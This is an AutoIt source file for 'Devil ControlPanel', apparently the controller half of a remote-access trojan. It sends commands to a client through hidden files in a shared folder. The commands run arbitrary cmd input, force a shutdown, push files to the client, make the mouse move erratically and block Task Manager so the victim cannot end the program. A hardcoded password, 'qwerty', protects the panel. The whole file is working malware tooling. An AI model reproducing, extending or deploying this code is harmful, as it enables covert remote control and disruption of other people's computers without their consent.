#cs ----------------------------------------------------------------------------

 Devil ControlPanel
 AutoIt Version: 3.3.14.5
 Version: Release ( 22:40 5.18.2018 )

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#include <File.au3>
#include <Misc.au3>
#include <MsgBoxConstants.au3>
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

; Variables
Local $Password = "qwerty" ; There must be a password for accessing the command panel!
Global $ClientID = ""
Global $InputBox = ""

; Exit hotkey
HotKeySet("{ESC}", "Terminate")

; Password protection
Local $Entered_Password = InputBox("Devil ControlPanel", "Enter the password to access the control panel!", "", "*", 270, 130)
If @error Then
    Exit
ElseIf Not($Entered_Password = $Password) Then
    MsgBox($MB_ICONERROR, "Devil Control Panel", "Wrong password!")
    Exit
EndIf

; Select shared folder ( server )
Global $Server_Directory = FileSelectFolder("Enter location of the shared folder!", "C:\")
If @error Then
    Exit
EndIf

; ------------------------------------------------------------------------------

; GUI
$ControlPanel = GUICreate("Devil ControlPanel", 301, 316, -1, -1)
GUISetBkColor(0xFFFFFF)
$Group1 = GUICtrlCreateGroup("Actions", 16, 48, 265, 153)
$ShowMessageBox_Button = GUICtrlCreateButton("Show Message Box", 24, 72, 251, 25)
$ExecuteToCMD_Button = GUICtrlCreateButton("Execute to CMD", 24, 104, 251, 25)
$SystemShutdown_Button = GUICtrlCreateButton("Shutdown", 24, 136, 251, 25)
$LoadFile_Button = GUICtrlCreateButton("Load File", 24, 168, 251, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Text = GUICtrlCreateLabel("Client ID", 16, 18, 62, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
$InputBox = GUICtrlCreateInput("", 88, 16, 193, 21)
$Group2 = GUICtrlCreateGroup("Crazy Mouse", 16, 216, 129, 89)
$CrazyMouse_EnableButton = GUICtrlCreateButton("Enable", 24, 240, 107, 25)
$CrazyMouse_DisableButton = GUICtrlCreateButton("Disable", 24, 272, 107, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group3 = GUICtrlCreateGroup("Block Task Manager", 160, 216, 121, 89)
$BlockTaskManager_EnableButton = GUICtrlCreateButton("Enable", 168, 240, 99, 25)
$BlockTaskManager_DisableButton = GUICtrlCreateButton("Disable", 168, 272, 99, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)

; ------------------------------------------------------------------------------

; Main Loop
While True
    Sleep(10)
	$GUICommand = GUIGetMsg()
	Switch $GUICommand
		Case $GUI_EVENT_CLOSE
			Terminate()
        Case $ShowMessageBox_Button
            LockGUI()
            ShowMessageBox()
            UnlockGUI()
        Case $ExecuteToCMD_Button
            LockGUI()
            ExecuteToCMD()
            UnlockGUI()
        Case $SystemShutdown_Button
            LockGUI()
            SystemShutdown()
            UnlockGUI()
        Case $LoadFile_Button
            LockGUI()
            LoadFile()
            UnlockGUI()
        Case $CrazyMouse_EnableButton
            LockGUI()
            EnableCrazyMouse()
            UnlockGUI()
        Case $CrazyMouse_DisableButton
            LockGUI()
            DisableCrazyMouse()
            UnlockGUI()
        Case $BlockTaskManager_EnableButton
            LockGUI()
            EnableBlockTaskManager()
            UnlockGUI()
        Case $BlockTaskManager_DisableButton
            LockGUI()
            DisableBlockTaskManager()
            UnlockGUI()
	EndSwitch
WEnd

; ------------------------------------------------------------------------------

; Show message box
Func ShowMessageBox()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $MessageBox_Text = InputBox("Devil ControlPanel", "Enter the text that will be displayed.", "", "", 270, 130)
        If Not @error Then
            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
            FileWriteLine($Temp_DataFile, "[Data]")
            FileWriteLine($Temp_DataFile, "Type=show_message")
            FileWriteLine($Temp_DataFile, "Command=" & $MessageBox_Text)
            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
            FileClose($Temp_DataFile)
            Sleep(1000)
        EndIf
    EndIf
EndFunc

; Execute CMD command
Func ExecuteToCMD()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $CMD_Command = InputBox("Devil ControlPanel", "Enter the cmd command.", "", "", 270, 130)
        If Not @error Then
            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
            FileWriteLine($Temp_DataFile, "[Data]")
            FileWriteLine($Temp_DataFile, "Type=execute_command")
            FileWriteLine($Temp_DataFile, "Command=" & $CMD_Command)
            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
            FileClose($Temp_DataFile)
            Sleep(1000) 
        EndIf
    EndIf
EndFunc

; Shutdown system
Func SystemShutdown()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        FileWriteLine($Temp_DataFile, "[Data]")
        FileWriteLine($Temp_DataFile, "Type=shutdown")
        FileWriteLine($Temp_DataFile, "Command=")
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileClose($Temp_DataFile)
        Sleep(1000) 
    EndIf
EndFunc

; Load file to the system
Func LoadFile()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $File_To_Load = FileOpenDialog("Select the file, that must be uploaded!", "C:\", "All (*.*)" )
        If Not @error Then
            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
            Local $File_Name = _PathSplit($File_To_Load, -1, -1, -1, -1) ; Get file name
            FileCopy($File_To_Load, $Server_Directory)
            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
            FileWriteLine($Temp_DataFile, "[Data]")
            FileWriteLine($Temp_DataFile, "Type=load_file")
            FileWriteLine($Temp_DataFile, "Command=" & $File_Name[3] & $File_Name[4])
            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
            FileClose($Temp_DataFile)
            Sleep(1000)
        EndIf
    EndIf
EndFunc

; Enable CrazyMouse
Func EnableCrazyMouse()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        FileWriteLine($Temp_DataFile, "[Data]")
        FileWriteLine($Temp_DataFile, "Type=crazy_mouse")
        FileWriteLine($Temp_DataFile, "Command=True")
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileClose($Temp_DataFile)
        Sleep(500) 
    EndIf
EndFunc

; Disable CrazyMouse
Func DisableCrazyMouse()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        FileWriteLine($Temp_DataFile, "[Data]")
        FileWriteLine($Temp_DataFile, "Type=crazy_mouse")
        FileWriteLine($Temp_DataFile, "Command=False")
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileClose($Temp_DataFile)
        Sleep(500) 
    EndIf
EndFunc

; Enable block task manager
Func EnableBlockTaskManager()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        FileWriteLine($Temp_DataFile, "[Data]")
        FileWriteLine($Temp_DataFile, "Type=block_task_manager")
        FileWriteLine($Temp_DataFile, "Command=True")
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileClose($Temp_DataFile)
        Sleep(500) 
    EndIf
EndFunc

; Disable block task manager
Func DisableBlockTaskManager()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        FileWriteLine($Temp_DataFile, "[Data]")
        FileWriteLine($Temp_DataFile, "Type=block_task_manager")
        FileWriteLine($Temp_DataFile, "Command=False")
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileClose($Temp_DataFile)
        Sleep(500) 
    EndIf
EndFunc

; Lock gui elements
Func LockGUI()
    GUICtrlSetState($ShowMessageBox_Button, $GUI_DISABLE)
    GUICtrlSetState($ExecuteToCMD_Button, $GUI_DISABLE)
    GUICtrlSetState($SystemShutdown_Button, $GUI_DISABLE)
    GUICtrlSetState($LoadFile_Button, $GUI_DISABLE)
    GUICtrlSetState($CrazyMouse_EnableButton, $GUI_DISABLE)
    GUICtrlSetState($CrazyMouse_DisableButton, $GUI_DISABLE)
    GUICtrlSetState($BlockTaskManager_EnableButton, $GUI_DISABLE)
    GUICtrlSetState($BlockTaskManager_DisableButton, $GUI_DISABLE)
    GUICtrlSetState($InputBox, $GUI_DISABLE)
EndFunc

; Unlock gui elements
Func UnlockGUI()
    GUICtrlSetState($ShowMessageBox_Button, $GUI_ENABLE)
    GUICtrlSetState($ExecuteToCMD_Button, $GUI_ENABLE)
    GUICtrlSetState($SystemShutdown_Button, $GUI_ENABLE)
    GUICtrlSetState($LoadFile_Button, $GUI_ENABLE)
    GUICtrlSetState($CrazyMouse_EnableButton, $GUI_ENABLE)
    GUICtrlSetState($CrazyMouse_DisableButton, $GUI_ENABLE)
    GUICtrlSetState($BlockTaskManager_EnableButton, $GUI_ENABLE)
    GUICtrlSetState($BlockTaskManager_DisableButton, $GUI_ENABLE)
    GUICtrlSetState($InputBox, $GUI_ENABLE)
EndFunc

; Exit
Func Terminate()
    If GUICtrlRead($InputBox) = "" Then
        Exit
    Else
        DisableCrazyMouse()
        DisableBlockTaskManager()
        Exit
    EndIf
EndFunc